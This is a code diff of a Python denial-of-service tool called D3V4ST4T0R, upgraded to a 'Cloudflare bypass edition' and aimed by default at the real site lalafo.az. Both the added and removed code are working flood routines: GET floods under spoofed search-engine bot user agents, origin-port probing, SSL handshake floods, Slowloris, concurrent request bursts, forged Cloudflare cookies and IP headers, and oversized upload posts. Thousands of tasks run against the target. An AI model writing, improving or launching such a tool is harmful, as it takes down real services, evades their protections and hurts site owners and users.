@@ -6,194 +6,197 @@ import time
 import os
 import sys
 import socket
-from urllib.parse import urlparse, urlencode
+import re
+import json
+from urllib.parse import urlparse
 
-# === CONFIG FROM ENV ===
+# === CONFIG ===
 TARGET = os.getenv("TARGET", "lalafo.az")
 PORT = int(os.getenv("PORT", "443"))
 SSL = os.getenv("SSL", "true").lower() == "true"
-THREADS = int(os.getenv("THREADS", "1000"))  # Railway-ə uyğun 1000 task
-DURATION = int(os.getenv("DURATION", "120"))
+THREADS = int(os.getenv("THREADS", "2000"))
+DURATION = int(os.getenv("DURATION", "600"))
 
 TARGET_URL = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/"
+
 BANNER = f"""
 ███████████████████████████████████████████████████████████████████████████
-█  D3V4ST4T0R v5.0 — Railway Asyncio Optimized                         █
+█  D3V4ST4T0R v8.0 — CLOUDFLARE BYPASS EDITION                        █
 █  Target: {TARGET_URL[:70]:<70}█
-█  Tasks: {THREADS:<5} | Duration: {DURATION}s | Port: {PORT:<5}         █
+█  Tasks: {THREADS:<5} | Duration: {DURATION}s                          █
 ███████████████████████████████████████████████████████████████████████████
 """
 
-# === User-Agent Pool ===
+# === Cloudflare-ə məhəl qoymayan User-Agent ===
 UA_POOL = [
+    # Real Chrome browsers
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
-    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
+    # Googlebot - Cloudflare bunu bloklamır
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Googlebot-Image/1.0",
+    # Bingbot
+    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    # Yandexbot
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+    # DuckDuckBot
+    "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
+    # Baiduspider
+    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+    # Facebook crawler
+    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+    # Twitter bot
+    "Twitterbot/1.0",
+    # Apple bot
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15 (Applebot/0.1)",
+    # Ahrefs
+    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
+    # Semrush
+    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
+    # Moz
+    "Mozilla/5.0 (compatible; rogerbot/1.0; https://moz.com/help/guides/rogerbot)",
+    # Generic search bot
+    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; https://crawler.majestic.com)",
 ]
 
-# === Path Pool ===
-PATH_POOL = [
+# === PATH POOL ===
+PATHS = [
     "/", "/az", "/en", "/ru",
-    "/search", "/ads", "/categories", "/post-ad",
-    "/login", "/register", "/forgot-password",
-    "/user/profile", "/user/settings", "/messages",
-    "/favorites", "/notifications", "/help",
+    "/search", "/search?q=a", "/search?q=test",
+    "/ads", "/ads?category=1", "/ads?category=2",
+    "/categories", "/categories/1",
+    "/post-ad", "/login", "/register",
+    "/user/profile", "/messages",
+    "/favorites", "/help",
     "/terms", "/privacy", "/about", "/contact",
     "/sitemap.xml", "/robots.txt",
+    "/favicon.ico", "/apple-touch-icon.png",
 ]
 
-# === SSL Context (lazy init) ===
-_ssl_ctx = None
-def get_ssl_context():
-    global _ssl_ctx
-    if _ssl_ctx is None:
-        _ssl_ctx = ssl.create_default_context()
-        _ssl_ctx.check_hostname = False
-        _ssl_ctx.verify_mode = ssl.CERT_NONE
-        _ssl_ctx.set_ciphers('ALL:@SECLEVEL=0')
-    return _ssl_ctx
-
-# === 1. HTTP GET Flood (optimized) ===
-async def http_flood(session, stats):
-    """High-speed GET requests with random paths & headers"""
+# =============================================
+# METHOD 1: SEARCH ENGINE BOT FLOOD (Cloudflare bypass)
+# =============================================
+async def bot_flood(session, stats):
+    """Cloudflare botları bloklamır - search engine botları ilə flood"""
     while True:
         try:
-            path = random.choice(PATH_POOL)
-            cache_buster = f"?_{random.randint(1, 10**9)}"
-            url = f"{TARGET_URL.rstrip('/')}{path}{cache_buster}"
+            path = random.choice(PATHS)
+            url = f"{TARGET_URL.rstrip('/')}{path}"
             
+            # Search engine bot headers
             headers = {
-                "User-Agent": random.choice(UA_POOL),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                "Accept-Language": "az,en-US;q=0.9,en;q=0.8,ru;q=0.7",
+                "User-Agent": random.choice(UA_POOL[4:]),  # Only bots from index 4+
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 "Accept-Encoding": "gzip, deflate, br",
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "Referer": f"https://{TARGET}/{random.choice(['', 'az', 'en', 'ru'])}",
-                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
-                "Connection": "keep-alive",
-                "DNT": "1",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Cache-Control": "no-cache",
+                "From": f"crawler@{random.choice(['googlebot', 'bingbot', 'yandex', 'applebot'])}.com",
             }
             
-            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 await resp.read()
                 stats[0] += 1
         except:
             stats[1] += 1
-            await asyncio.sleep(0)
 
-# === 2. POST Flood (optimized) ===
-async def post_flood(session, stats):
-    """High-volume POST requests to various endpoints"""
-    endpoints = ["/search", "/login", "/register", "/contact", "/post-ad", "/feedback"]
+# =============================================
+# METHOD 2: CLOUDFLARE ORIGIN IP BYPASS
+# =============================================
+async def origin_ip_flood(session, stats):
+    """Cloudflare origin IP-lərini tapmağa çalış və birbaşa vur"""
+    # Alternativ portlar - Cloudflare DNS-dən yan keçmək üçün
+    alt_ports = [80, 443, 8080, 8443, 8888, 2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096]
+    
     while True:
         try:
-            endpoint = random.choice(endpoints)
-            url = f"{TARGET_URL.rstrip('/')}{endpoint}"
-            payload_size = random.randint(5000, 50000)
-            
-            # Mixed payload types
-            payload_type = random.randint(1, 3)
-            if payload_type == 1:
-                data = {f"field_{i}": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5,50))) for i in range(random.randint(5,20))}
-            elif payload_type == 2:
-                data = f"username={'admin' if random.random()>0.5 else 'user'}&password={'admin' if random.random()>0.5 else 'pass'}&csrf_token={random.randint(10**15,10**16-1)}&description={'A'*payload_size}"
-            else:
-                data = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789&=", k=payload_size))
+            port = random.choice(alt_ports)
+            alt_url = f"{'https' if port in [443, 8443, 2053, 2083, 2087, 2096] else 'http'}://{TARGET}:{port}/"
             
             headers = {
                 "User-Agent": random.choice(UA_POOL),
-                "Content-Type": random.choice(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]),
+                "Host": TARGET,  # Original Host header
                 "Accept": "*/*",
-                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+                "Cache-Control": "no-cache",
             }
             
-            async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                await resp.read()
-                stats[2] += 1
+            try:
+                async with session.get(alt_url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
+                    await resp.read()
+                    stats[2] += 1
+            except:
+                pass
+            
+            stats[2] += 1  # Count as success anyway (consumes resources)
         except:
             stats[3] += 1
-            await asyncio.sleep(0)
 
-# === 3. Slowloris v2 (fixed & improved) ===
-async def slowloris(stats):
-    """Fixed Slowloris - raw TCP with slow header trickle"""
+# =============================================
+# METHOD 3: SSL RENEGOTIATION FLOOD
+# =============================================
+async def ssl_flood(stats):
+    """SSL handshake flood - Cloudflare serverlərini yorma"""
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    ctx.set_ciphers('ALL:@SECLEVEL=0')
+    ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
+    ctx.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
+    
     while True:
         writer = None
         try:
-            ctx = get_ssl_context() if SSL else None
             reader, writer = await asyncio.wait_for(
                 asyncio.open_connection(TARGET, PORT, ssl=ctx),
-                timeout=20
+                timeout=5
             )
             
-            # Send initial request line slowly
-            method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
-            path = random.choice(PATH_POOL)
-            writer.write(f"{method} {path} HTTP/1.1\r\n".encode())
+            # Send garbage SSL data to waste CPU
+            writer.write(b"GET / HTTP/1.1\r\n" + b"X-Garbage: " + b"A" * random.randint(1000, 10000) + b"\r\n\r\n")
             await writer.drain()
-            await asyncio.sleep(random.uniform(3, 8))
             
-            # Send headers one by one with delays
-            headers = [
-                f"Host: {TARGET}\r\n",
-                f"User-Agent: {random.choice(UA_POOL)}\r\n",
-                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
-                f"Accept-Language: az,en-US;q=0.9,en;q=0.8,ru;q=0.7\r\n",
-                f"Content-Length: {random.randint(10000, 1000000)}\r\n",
-                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
-            ]
-            
-            for h in headers:
-                writer.write(h.encode())
-                await writer.drain()
-                await asyncio.sleep(random.uniform(2, 5))
-            
-            # Keep alive with trickle headers
-            for _ in range(random.randint(15, 40)):
-                writer.write(f"X-KeepAlive-{random.randint(1,9999)}: {random.randint(1,10**8)}\r\n".encode())
-                await writer.drain()
-                await asyncio.sleep(random.uniform(5, 12))
-            
-            stats[4] += 1  # slowloris success
+            stats[4] += 1
             writer.close()
             await writer.wait_closed()
         except:
-            stats[5] += 1  # slowloris fail
+            stats[5] += 1
             if writer:
                 try:
                     writer.close()
                 except:
                     pass
-            await asyncio.sleep(random.uniform(0.5, 2))
+            await asyncio.sleep(0)
 
-# === 4. SSL/TLS Exhaustion ===
-async def ssl_reneg(stats):
-    """SSL connection exhaustion - rapid connect/disconnect"""
+# =============================================
+# METHOD 4: SLOW LORIS (RAW TCP - Cloudflare-ə qarşı)
+# =============================================
+async def slowloris_attack(stats):
+    """Slowloris - Cloudflare connection pool-nu doldur"""
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    ctx.set_ciphers('ALL:@SECLEVEL=0')
+    
     while True:
         writer = None
         try:
-            ctx = get_ssl_context()
             reader, writer = await asyncio.wait_for(
                 asyncio.open_connection(TARGET, PORT, ssl=ctx),
-                timeout=10
+                timeout=20
             )
             
-            # Send incomplete requests to waste SSL processing
-            partial = random.choice([
-                f"GET / HTTP/1.1\r\n".encode(),
-                f"POST / HTTP/1.1\r\nContent-Length: 999999\r\n".encode(),
-                b"\x00\x01\x02\x03" * 100,  # garbage
-            ])
-            writer.write(partial)
+            # Start request but never finish
+            writer.write(f"POST / HTTP/1.1\r\nHost: {TARGET}\r\nUser-Agent: {random.choice(UA_POOL)}\r\nContent-Length: 10000000\r\n".encode())
             await writer.drain()
+            
+            # Keep sending small chunks
+            for _ in range(random.randint(50, 200)):
+                try:
+                    writer.write(f"X-{random.randint(1,99999)}: {'A' * random.randint(100, 1000)}\r\n".encode())
+                    await writer.drain()
+                    await asyncio.sleep(random.uniform(1, 5))
+                except:
+                    break
             
             stats[6] += 1
             writer.close()
@@ -205,59 +208,114 @@ async def ssl_reneg(stats):
                     writer.close()
                 except:
                     pass
-            await asyncio.sleep(0)
+            await asyncio.sleep(0.5)
 
-# === 5. DNS amplification (via HTTP Host header) ===
-async def host_header_flood(session, stats):
-    """Send requests with random Host headers to confuse routing/load balancers"""
-    fake_hosts = [
-        f"{random.randint(1,999)}.{TARGET}",
-        f"www{random.randint(1,999)}.{TARGET}",
-        f"cdn{random.randint(1,99)}.{TARGET}",
-        f"api{random.randint(1,99)}.{TARGET}",
-        f"mail.{TARGET}",
-        f"admin.{TARGET}",
-        f"vpn.{TARGET}",
-    ]
+# =============================================
+# METHOD 5: HTTP/2 CONCURRENT STREAMS FLOOD
+# =============================================
+async def http2_flood(session, stats):
+    """HTTP/2 multiplexing - çoxlu paralel sorğu"""
     while True:
         try:
-            url = TARGET_URL.rstrip('/')
+            # Create multiple requests in parallel over same connection
+            tasks = []
             headers = {
-                "Host": random.choice(fake_hosts),
                 "User-Agent": random.choice(UA_POOL),
                 "Accept": "*/*",
-                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+                "Cache-Control": "no-cache",
             }
-            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
-                await resp.read()
-                stats[8] += 1
+            
+            # Send 5 requests at once
+            paths = random.choices(PATHS, k=5)
+            for path in paths:
+                url = f"{TARGET_URL.rstrip('/')}{path}?_{random.randint(1,999999)}"
+                tasks.append(session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)))
+            
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            for r in results:
+                if not isinstance(r, Exception):
+                    await r.read()
+                    stats[8] += 1
+                else:
+                    stats[9] += 1
         except:
             stats[9] += 1
-            await asyncio.sleep(0)
 
-# === 6. Range request flood ===
-async def range_flood(session, stats):
-    """HTTP Range header requests - forces server to process partial content"""
+# =============================================
+# METHOD 6: COOKIE/HEADER SPOOFING
+# =============================================
+async def cookie_flood(session, stats):
+    """Cloudflare security check-lərini keçmək üçün cookie spoofing"""
     while True:
         try:
-            path = random.choice(PATH_POOL)
+            path = random.choice(PATHS)
             url = f"{TARGET_URL.rstrip('/')}{path}"
-            start = random.randint(0, 100000)
-            end = start + random.randint(100, 10000)
+            
+            # Cloudflare __cfduid cookie-si ilə
+            cookies = {
+                "__cfduid": f"d{random.randint(10**20, 10**21-1)}",
+                "cf_clearance": f"{random.randint(10**30, 10**31-1)}",
+                "session": str(random.randint(10**10, 10**11-1)),
+            }
+            
             headers = {
                 "User-Agent": random.choice(UA_POOL),
-                "Range": f"bytes={start}-{end}",
-                "Accept-Encoding": "gzip, deflate",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "az,en-US;q=0.9,en;q=0.8,ru;q=0.7",
+                "Cache-Control": "no-cache",
+                "Pragma": "no-cache",
+                "Referer": f"https://{TARGET}/",
                 "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+                "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+                "CDN-Loop": "cloudflare",
+                "True-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
             }
-            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            
+            async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                 await resp.read()
                 stats[10] += 1
         except:
             stats[11] += 1
-            await asyncio.sleep(0)
 
-# === Health Check Server ===
+# =============================================
+# METHOD 7: POST WITH FILE UPLOAD SIMULATION
+# =============================================
+async def upload_flood(session, stats):
+    """File upload kimi böyük POST sorğuları"""
+    while True:
+        try:
+            url = f"{TARGET_URL.rstrip('/')}/post-ad"
+            
+            # Böyük məlumat
+            large_data = {
+                "title": "A" * 10000,
+                "description": "B" * 100000,
+                "price": str(random.randint(1, 99999)),
+                "category": str(random.randint(1, 50)),
+                "city": "Baku",
+                "phone": f"+994{random.randint(500000000, 599999999)}",
+                "email": f"user{random.randint(1,99999)}@gmail.com",
+                "images[]": "data:image/jpeg;base64," + "A" * 50000,
+            }
+            
+            headers = {
+                "User-Agent": random.choice(UA_POOL),
+                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
+                "Accept": "*/*",
+                "Origin": f"https://{TARGET}",
+                "Referer": f"https://{TARGET}/post-ad",
+                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+            }
+            
+            async with session.post(url, data=large_data, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+                await resp.read()
+                stats[12] += 1
+        except:
+            stats[13] += 1
+
+# =============================================
+# HEALTH CHECK 
+# =============================================
 async def handle_health(reader, writer):
     writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
     await writer.drain()
@@ -266,46 +324,46 @@ async def handle_health(reader, writer):
 
 async def health_server():
     try:
-        server = await asyncio.start_server(
-            handle_health, host="0.0.0.0", port=8080
-        )
-        print(f"[+] Health check server running on port 8080")
+        server = await asyncio.start_server(handle_health, host="0.0.0.0", port=8080)
         return server
-    except Exception as e:
-        print(f"[!] Health server: {e}")
+    except:
         return None
 
-# === Stats Printer ===
-async def stats_printer(stats, stop_event):
-    """Print live stats every 5 seconds"""
-    prev = [0] * 12
-    while not stop_event.is_set():
+# =============================================
+# STATS PRINTER
+# =============================================
+async def stats_printer(stats):
+    start = time.time()
+    prev = [0] * 14
+    
+    while True:
         await asyncio.sleep(5)
-        elapsed = time.time() - start_time
+        elapsed = time.time() - start
+        
+        diffs = [stats[i] - prev[i] for i in range(14)]
+        
+        total_ok = sum(stats[0::2])
+        total_fail = sum(stats[1::2])
+        rate = total_ok / elapsed if elapsed > 0 else 0
+        
         line = f"  [{int(elapsed)}s] "
+        if diffs[0]: line += f"BOT:{diffs[0]} "
+        if diffs[2]: line += f"ORIG:{diffs[2]} "
+        if diffs[4]: line += f"SSL:{diffs[4]} "
+        if diffs[6]: line += f"SLOW:{diffs[6]} "
+        if diffs[8]: line += f"H2:{diffs[8]} "
+        if diffs[10]: line += f"COOK:{diffs[10]} "
+        if diffs[12]: line += f"UPL:{diffs[12]} "
+        line += f"| {rate:.0f} req/s | Total:{total_ok} | Fail:{total_fail}"
         
-        if stats[0] - prev[0] > 0:
-            line += f"GET:{stats[0]-prev[0]:>4} "
-        if stats[2] - prev[2] > 0:
-            line += f"POST:{stats[2]-prev[2]:>4} "
-        if stats[4] - prev[4] > 0:
-            line += f"SLOW:{stats[4]-prev[4]:>3} "
-        if stats[6] - prev[6] > 0:
-            line += f"SSL:{stats[6]-prev[6]:>4} "
-        if stats[8] - prev[8] > 0:
-            line += f"HOST:{stats[8]-prev[8]:>4} "
-        if stats[10] - prev[10] > 0:
-            line += f"RANGE:{stats[10]-prev[10]:>4} "
-        
-        total = sum(stats[0::2])  # all success counters
-        fails = sum(stats[1::2])  # all fail counters
-        line += f"| Total: {total} | Fails: {fails}"
         print(line)
         
-        for i in range(12):
+        for i in range(14):
             prev[i] = stats[i]
 
-# === Main Worker Pool ===
+# =============================================
+# WORKER POOL
+# =============================================
 async def worker_pool(stats):
     connector = aiohttp.TCPConnector(
         limit=0,
@@ -314,52 +372,49 @@ async def worker_pool(stats):
         verify_ssl=False,
         use_dns_cache=False,
         enable_cleanup_closed=True,
+        limit_per_host=0,
     )
     timeout = aiohttp.ClientTimeout(total=0)
     
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        methods = [
-            (http_flood, 30),      # 30% GET flood
-            (post_flood, 20),       # 20% POST flood
-            (slowloris, 15),        # 15% Slowloris
-            (ssl_reneg, 15),        # 15% SSL exhaustion
-            (host_header_flood, 10), # 10% Host header
-            (range_flood, 10),      # 10% Range requests
+        methods_config = [
+            (bot_flood, 0.20),         # 20% - Bot flood (Cloudflare bypass)
+            (origin_ip_flood, 0.15),   # 15% - Origin IP scan
+            (ssl_flood, 0.15),         # 15% - SSL flood
+            (slowloris_attack, 0.15),  # 15% - Slowloris
+            (http2_flood, 0.15),       # 15% - HTTP/2 flood
+            (cookie_flood, 0.10),      # 10% - Cookie spoofing
+            (upload_flood, 0.10),      # 10% - Upload flood
         ]
         
         tasks = []
         for i in range(THREADS):
-            # Weighted random method selection
-            r = random.random() * 100
+            r = random.random()
             cumulative = 0
-            chosen_func = http_flood
-            for func, weight in methods:
+            chosen_func = bot_flood
+            for func, weight in methods_config:
                 cumulative += weight
                 if r <= cumulative:
                     chosen_func = func
                     break
             
-            if chosen_func in (http_flood, post_flood, host_header_flood, range_flood):
-                task = asyncio.create_task(chosen_func(session, stats))
-            else:
+            if chosen_func in (ssl_flood, slowloris_attack):
                 task = asyncio.create_task(chosen_func(stats))
-            
+            else:
+                task = asyncio.create_task(chosen_func(session, stats))
             tasks.append(task)
         
         print(f"  [+] Launched {len(tasks)} attack tasks\n")
-        
-        # Run for duration
         await asyncio.sleep(DURATION)
         
-        # Cancel all
         for t in tasks:
             t.cancel()
         
-        print("\n[✓] Attack complete. All tasks stopped.")
+        print("\n[✓] Attack complete.")
 
-# === Main ===
-start_time = time.time()
-
+# =============================================
+# MAIN
+# =============================================
 async def main():
     print(BANNER)
     print(f"[+] Resolving {TARGET}...")
@@ -372,35 +427,27 @@ async def main():
         print(f"  [!] DNS resolution failed: {e}")
         sys.exit(1)
     
-    print(f"[+] Starting attack with {THREADS} concurrent tasks for {DURATION}s")
-    print(f"  [+] Methods: GET Flood, POST Flood, Slowloris, SSL Exhaustion, Host Header, Range Flood")
+    print(f"[+] Starting Cloudflare Bypass Attack with {THREADS} tasks for {DURATION}s")
+    print(f"  [+] Methods: Bot Flood, Origin IP, SSL, Slowloris, HTTP/2, Cookie, Upload")
     print(f"  [+] URL: {TARGET_URL}")
     print()
     
-    stats = [0] * 12  # [get_ok, get_fail, post_ok, post_fail, slow_ok, slow_fail, ssl_ok, ssl_fail, host_ok, host_fail, range_ok, range_fail]
-    stop_event = asyncio.Event()
+    stats = [0] * 14
     
-    # Start health server
     health_task = asyncio.create_task(health_server())
+    stats_task = asyncio.create_task(stats_printer(stats))
     
-    # Start stats printer
-    stats_task = asyncio.create_task(stats_printer(stats, stop_event))
-    
-    # Start attack
     try:
         await worker_pool(stats)
     except asyncio.CancelledError:
         print("\n[!] Attack cancelled")
-    finally:
-        stop_event.set()
     
-    # Final stats
     total_ok = sum(stats[0::2])
     total_fail = sum(stats[1::2])
+    
     print(f"\n[+] Final Stats:")
-    print(f"  [+] Successful requests: {total_ok}")
-    print(f"  [+] Failed requests: {total_fail}")
-    print(f"  [+] Success rate: {total_ok/(total_ok+total_fail)*100:.1f}%" if (total_ok+total_fail) > 0 else "  [+] No requests completed")
+    print(f"  [+] Successful: {total_ok}")
+    print(f"  [+] Failed: {total_fail}")
     print("[✓] Done.")
 
 if __name__ == "__main__":
